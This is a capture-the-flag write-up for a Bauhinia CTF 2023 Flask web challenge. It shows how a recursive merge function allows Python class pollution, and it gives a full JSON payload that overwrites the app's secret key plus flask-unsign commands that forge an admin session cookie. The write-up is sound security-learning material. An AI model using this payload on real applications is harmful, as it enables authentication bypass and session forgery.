# Hansel and Gretel

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 32 solves / 90 points
- Author: hollow
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

**粉碎糖果屋**

> 天 邊一光 找個更好出口  
> 不絕望就自由 圍牆戳穿 以後

[https://www.youtube.com/watch?v=FjS50ATT1v0](https://www.youtube.com/watch?v=FjS50ATT1v0)

Hi! We're Hansel and Gretel! We've started a bulletin board with the help of a witch to share our life with you! We heard the witch hid something sweet at somewhere only she has access of, can you help us find it?

Web: [http://chall-us.pwnable.hk:30009](http://chall-us.pwnable.hk:30009) , [http://chall-hk.pwnable.hk:30009](http://chall-hk.pwnable.hk:30009)

Attachment: [hansel-and-gretel_041a7127b7f1d72ff210f3168158baed.tar.gz](https://ctf.b6a.black/files/hansel-and-gretel_041a7127b7f1d72ff210f3168158baed.tar.gz)

Note: The bulletin board will be rebuilt every 10 minutes.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821090216.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821075033.png)

In here, we can view Hansel and Gretel's bulletin board, and there's a post called "Our First Adventure!".

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/Web/Hansel-and-Gretel/hansel-and-gretel_041a7127b7f1d72ff210f3168158baed.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Hansel-and-Gretel)-[2023.08.21|9:04:08(HKT)]
└> file hansel-and-gretel_041a7127b7f1d72ff210f3168158baed.tar.gz 
hansel-and-gretel_041a7127b7f1d72ff210f3168158baed.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 20480
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Hansel-and-Gretel)-[2023.08.21|9:04:10(HKT)]
└> tar xf hansel-and-gretel_041a7127b7f1d72ff210f3168158baed.tar.gz 
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Hansel-and-Gretel)-[2023.08.21|9:04:13(HKT)]
└> ls -lah chall 
total 20K
drwxr-xr-x 3 siunam nam 4.0K Aug 18 02:07 .
drwxr-xr-x 3 siunam nam 4.0K Aug 21 09:04 ..
drwxr-xr-x 3 siunam nam 4.0K Aug 18 02:07 app
-rw-r--r-- 1 siunam nam  258 Aug 18 02:14 Dockerfile
-rw-r--r-- 1 siunam nam   72 Aug 18 02:07 start.sh
```

**Dockerfile:**
```bash
FROM ubuntu:20.04

ENV FLAG b6actf{test_flag}

RUN apt update && apt install -y python3 python3-pip
RUN pip3 install requests flask flask-session

RUN mkdir /app
COPY app /app
COPY start.sh /start.sh
RUN chmod 555 /start.sh

WORKDIR /app

CMD [ "/start.sh" ]
```

**This Docker image will install Python's Flask framework and run `start.sh`:**
```sh
#!/bin/bash
set -e
while true; do timeout 600 python3 /app/app.py ; done
```

Then, it'll run `python3 /app/app.py` every 10 minutes (600 seconds).

In `/app/app.py`, we can see there's a few routes.

**Route `/flag`:**
```python
[...]
app = Flask(__name__)
app.config["SECRET_KEY"] = str(os.urandom(32))
app.config["SESSION_COOKIE_HTTPONLY"] = False
app.add_template_global(randint)
[...]
@app.route("/flag")
def flag():
    if session.get("user") != "witch":
        return render_template("template.html", status=403, message="You are not the witch.")
    return render_template("template.html", status=200, message=os.environ["FLAG"])
```

When the Flask's session's `user` is `witch`, it'll render the flag's value from the environment variable.

Hmm... Which means we need to somehow **forge our Flask's session cookie in order to change the `user`'s value to `witch`?**

**Route `/`, `/load_bulletins`:**
```python
class Board():
    def __init__(self): pass

    @property
    def pinned_content(self):
        return [{
            "title": "Our First Adventure!", 
            "text": "Today we went to the forest and you can't believe what we've got to! It's a house made out of gingerbread, cake and candy! How sweet it is!"
        }]
    
    current_content = []

    [...]

    def load(self):
        res = self.pinned_content
        if isinstance(self.current_content, list) and len(self.current_content) > 0 and all(["title" in x and "text" in x for x in self.current_content]):
            res.extend(self.current_content)
        if hasattr(self, "new_content") and self.new_content is not None:
            new_content = getattr(self, "new_content")
            self.current_content.extend(new_content)
            res.extend(new_content)
            self.new_content = None
        return res[::-1]
[...]
bulletin_board = Board()
[...]
@app.route("/")
def index():
    session["user"] = "hansel & gretel"
    bulletins = requests.post("http://localhost:3000/load_bulletins").json()
    return render_template("index.html", bulletins=bulletins)
```

**When we go to `/`, it'll set our session's `user` to `hansel & gretel`, send a POST request to `/load_bulletins` route, and render the `bulletins` JSON data:**
```python
@app.route("/load_bulletins", methods=["POST"])
def load_bulletins():
    return bulletin_board.load(), 200, {"Content-Type": "application/json"}
```

The `load()` method from class `Board` will first append the "Our First Adventure!" post, then append other `new_content`.

But how can we create `new_content`?

**Route `/save_bulletins`:**
```python
@app.route("/save_bulletins", methods=["POST"])
def save_bulletins():
    if not request.is_json:
        raise Exception("Only accept JSON.")
    bulletin_board.save(request.data)
    return {"message": "Bulletins saved."}, 200, {"Content-Type": "application/json"}
```

When we send a POST request to `/save_bulletins`, it'll check the request's header `Content-Type` is `application/json` or not. If it's correct, call `save()` method with our request's data from class `Board`.

```python
class Board():
    [...]
    def save(self, data):
        data_ = json.loads(data)
        if "new_content" not in data_:
            raise Exception("There is nothing to save.")
        if not isinstance(data_["new_content"], list) and not len(data_["new_content"]) > 0 and not all([isinstance(x, dict) for x in data_["new_content"]]):
            raise Exception("\"new_content\" should be a non-empty list of JSON-like objects.")
        if not all(["title" in x and "text" in x for x in data_["new_content"]]):
            raise Exception("Please check your bulletin format")
        set_(data_, self)
    [...]
```

In the `save()` method, it's basically validating the request's JSON data matches the following format:

```json
{
    "new_content":
    [
        {
            "title": "foobar",
            "text": "blah"
        }
    ]
}
```

If it matches, it'll call function `set_` with our request's JSON data and the `bulletin_board` object instance as the argument.

```python
def set_(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                set_(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            set_(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

In the above `set_()` function, it's basically a ***recursive merge function***. This recursive merge function will take the `bulletin_board` object instance, and merge our request's JSON data to it.

Right off the bat, based on my experience, it's clear that the `set_` function is vulnerable to Python's ***class pollution*** (AKA prototype pollution in Python).

> Note: For more details about class pollution, you can read Abdulrah33m's research blog post about "[Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)", and one of my web challenge writeup from PwnMe 2023 8 bits: [https://siunam321.github.io/ctf/PwnMe-2023-8-bits/Web/Anozer-Blog/](https://siunam321.github.io/ctf/PwnMe-2023-8-bits/Web/Anozer-Blog/).

According to [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution#overwriting-flask-secret-across-files), we can **overwrite Flask's secret via exploiting class pollution**. If we can overwrite it, we can **forge our own session cookie**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821101552.png)

> Flask's secret (`app.config["SECRET_KEY"]`) is to **sign Flask's session cookie**.

## Exploitation

Let's test it locally!

**app_modified.py:**
```python
[...]
@app.route("/check")
def checkIsPolluted():
    print(bulletin_board.__class__.__init__.__globals__['__loader__'].__init__.__globals__['sys'].modules['__main__'].app.secret_key)
    return render_template("template.html", status=200, message=app.config["SECRET_KEY"])

if __name__ == "__main__":
    app.run(host="0.0.0.0", port="3000", debug=True)
```

In here, I added a new route called `/check`, and it'll render and print out the Flask's secret's value.

```shell
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Hansel-and-Gretel/chall/app)-[2023.08.21|10:19:38(HKT)]
└> python3 app_modified.py 
 * Serving Flask app 'app_modified'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:3000
 * Running on http://10.69.96.100:3000
[...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821102118.png)

Currently the Flask's secret is a 32 bits of random strings.

**To overwrite it, we can send the following class pollution payload to `/save_bulletins` POST route:**
```json
{
    "new_content":
    [
        {
            "title": "foobar",
            "text": "blah"
        }
    ],
    "__class__":
    {
        "__init__":
        {
            "__globals__":
            {
                "__loader__":
                {
                    "__init__":
                    {
                        "__globals__":
                        {
                            "sys":
                            {
                                "modules":
                                {
                                    "__main__":
                                    {
                                        "app":
                                        {
                                            "secret_key": "pwned"
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821102428.png)

**Then, check the secret's value:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821102446.png)

Nice! We successfully overwritten the Flask's secret! 

**Let's do it again on the challenge's instance!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821102629.png)

**Then copy the session cookie's value and decode it via `flask-unsign`:**
```shell
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Hansel-and-Gretel)-[2023.08.21|10:26:58(HKT)]
└> flask-unsign --decode --cookie 'eyJ1c2VyIjoiaGFuc2VsICYgZ3JldGVsIn0.ZOK3eQ.k_ijKh66tNctzYGXOT7mT-D61N4'
{'user': 'hansel & gretel'}
```

**Currently the `user` claim (key)'s value is `hansel & gretel`. We can sign the session cookie with our newly polluted secret:**
```shell
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Hansel-and-Gretel)-[2023.08.21|10:28:09(HKT)]
└> flask-unsign --sign --cookie "{'user': 'witch'}" --secret 'pwned'                                      
eyJ1c2VyIjoid2l0Y2gifQ.ZOLLvQ.2dNDxgmb-KruQMGetUJEUyDsQrU
```

**Finally, copy the forged session cookie and paste it to the old session cookie, and send a GET request to `/flag`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821102931.png)

- **Flag: `b6actf{p0llute_the_w0r1d_4_sweet_sweet_c00k1es}`**

## Conclusion

What we've learned:

1. Overwriting Flask's secret via class pollution